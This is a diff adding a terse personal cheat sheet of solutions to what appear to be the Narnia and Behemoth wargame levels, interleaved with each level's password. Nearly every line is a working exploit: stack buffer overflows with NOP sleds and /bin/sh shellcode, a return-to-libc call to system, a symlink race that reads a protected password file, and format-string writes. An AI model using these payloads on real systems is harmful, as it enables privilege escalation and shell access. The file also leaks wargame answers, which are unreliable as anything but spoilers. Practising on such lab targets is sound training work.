@@ -1,0 +1,44 @@
+narnia
+
+Pass place- /etc/narnia_pass/
+0- (echo -e "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde"; cat ;)| ./narnia0
+1 - efeidiedae
+
+1- export EGG=$(python -c 'print "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"')
+2 - nairiepecu
+
+2- /narnia/narnia2 $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
+3 - vaequeezee
+
+3- i=$(python -c 'print "/tmp/"+"A"*27+"/tmp/folder/pass"')
+   touch /tmp/folder/pass
+   chmod 777 /tmp/folder/pass
+   mkdir -p /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/folder/
+   ln -s /etc/narnia_pass/narnia4 $i
+   ./narnia3 $i
+   cat /tmp/folder/pass
+4 - thaenohtai
+
+4- /narnia/narnia4 $(python -c 'print (264-25)*"\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xd8\xd7\xff\xff"')
+   cat /etc/narnia_pass/narnia5
+5 - faimahchiy
+
+5- ./narnia5 $(python -c 'print "\xd0\xd6\xff\xff" + "%496x%1$n"')
+6 - neezocaeng
+
+6- p system -מוצאים את הפוינטר לסיסטם
+   ./narnia6 $(python -c 'print "A"*8 + "\x50\xc8\xe4\xf7"') "BBBBBBBB/bin/sh"
+7 - ahkiaziphu
+
+7- ./narnia7 $(python -c 'print "\x38\xd6\xff\xff" + "%134514464x%2$n"')
+8 - mohthuphog
+
+Behemoth
+Pass place - /etc/behemoth_pass/
+
+1 - aesebootiv
+
+1- export EGG=$(python -c 'print "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"')
+
+(python -c 'print "A"*79+"\x2f\xde\xff\xff"';cat;) | /behemoth/behemoth1
+(gdb) x/s *((char **)environ+3) = see location of EGG
